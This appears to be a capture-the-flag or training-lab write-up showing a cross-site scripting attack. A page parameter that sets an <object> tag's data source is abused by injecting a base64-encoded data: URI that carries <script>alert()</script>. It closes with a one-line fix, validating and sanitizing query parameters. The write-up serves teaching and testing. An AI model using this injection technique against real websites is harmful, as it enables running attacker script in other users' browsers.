On the home page we can see that just one image is clickable, it's redirect us to: `http://{IP}/?page=media&src=nsa`

After inspecting the HTML page we find the image displayed by `<object>`
And the data of the object tag chosen by the src variable in the url

```
<object data="http://{IP}/images/nsa_prism.jpg"></object>
```

| text/html                  | base64                           |
| -------------------------- | -------------------------------- |
| `<script>alert()</script>` | PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+ |

```
http://$IP/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+
```

---

> How to secure :
>
> - Validate and sanitize query parameters
